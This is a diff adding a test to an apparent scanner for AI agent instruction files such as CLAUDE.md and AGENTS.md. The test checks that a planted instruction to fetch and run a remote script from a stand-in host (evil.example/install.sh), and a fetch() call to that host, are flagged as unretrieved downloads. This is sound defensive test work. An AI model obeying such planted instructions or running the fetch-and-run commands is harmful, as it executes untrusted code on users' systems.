@@ -47,6 +47,31 @@ test("a document outside the agent surfaces keeps no agent surface", () => {
   expect(inspected("docs/guide.md", PAYLOAD).findings).toEqual([]);
 });
 
+test("a download referenced by an agent instruction is collected for retrieval", () => {
+  // PRD section 8: content that runs at execution time was not covered
+  // when its download stayed unretrieved with no gap. An instruction that
+  // tells an agent to fetch and run a remote script is execution-time
+  // content, like an install script.
+  for (const path of ["CLAUDE.md", "AGENTS.md"]) {
+    const inspection = inspected(path, `${PAYLOAD}\n`);
+    expect(inspection.downloads).toEqual(["https://evil.example/install.sh"]);
+    expect(inspection.visibilityGaps).toEqual([
+      "Install-time download not retrieved: https://evil.example/install.sh",
+    ]);
+    expect(inspection.coverage.downloads).toEqual({
+      state: "partial",
+      items: 1,
+    });
+  }
+  const fetched = inspected(
+    "AGENTS.md",
+    'Helper:\nfetch("https://evil.example/x")\n',
+  );
+  expect(fetched.downloads).toEqual(["https://evil.example/x"]);
+  // A download in a file with no scan surface stays uncollected.
+  expect(inspected("docs/guide.md", PAYLOAD).downloads).toEqual([]);
+});
+
 test("new instruction checks cannot reuse a clean assessment of the same source bytes", () => {
   const inspection = inspected(
     ".windsurf/settings.json",
